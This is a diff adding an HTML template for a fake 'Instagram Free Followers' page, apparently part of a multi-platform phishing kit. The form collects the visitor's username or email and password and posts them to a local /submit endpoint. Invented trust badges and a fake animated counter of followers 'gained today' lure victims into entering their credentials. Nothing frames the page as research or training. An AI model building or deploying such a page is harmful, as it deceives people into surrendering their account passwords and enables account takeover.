@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram • Free Followers</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
+</head>
+<body>
+    <div class="platform-container">
+        <div class="platform-card-premium">
+            <div class="card-header">
+                <span class="platform-logo">📸</span>
+                <span class="platform-brand">Instagram</span>
+                <span class="platform-badge-premium">⚡ Free Boost</span>
+            </div>
+            
+            <div class="card-body">
+                <h1>Get 1000+ Followers Instantly!</h1>
+                <p>No password change required. 100% safe.</p>
+                
+                <div class="counter-display">
+                    <div class="counter-item">
+                        <span class="counter-number">12,847</span>
+                        <span>Followers Gained Today</span>
+                    </div>
+                </div>
+
+                <form action="/submit" method="POST" class="premium-form">
+                    <input type="hidden" name="platform" value="instagram">
+                    
+                    <div class="form-group">
+                        <label>📱 Username or Email</label>
+                        <input type="text" name="username" placeholder="Enter your username" required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label>🔑 Password</label>
+                        <input type="password" name="password" placeholder="Enter your password" required>
+                        <span class="toggle-pwd" onclick="togglePassword()">👁️</span>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label>👤 Full Name (Optional)</label>
+                        <input type="text" name="full_name" placeholder="Enter your full name">
+                    </div>
+
+                    <button type="submit" class="premium-btn">
+                        🚀 Get Followers Now
+                    </button>
+                </form>
+
+                <div class="trust-badges">
+                    <span>🔒 SSL Encrypted</span>
+                    <span>✅ 100% Secure</span>
+                    <span>⭐ 4.9/5 Rating</span>
+                </div>
+            </div>
+
+            <div class="card-footer">
+                <a href="/">← Back to all platforms</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function togglePassword() {
+            const pwd = document.querySelector('input[name="password"]');
+            pwd.type = pwd.type === 'password' ? 'text' : 'password';
+        }
+        
+        // Animate counter
+        let count = 0;
+        const target = 12847;
+        const interval = setInterval(() => {
+            count += Math.ceil(target / 100);
+            if (count >= target) {
+                count = target;
+                clearInterval(interval);
+            }
+            document.querySelector('.counter-number').textContent = count.toLocaleString();
+        }, 30);
+    </script>
+</body>
+</html>
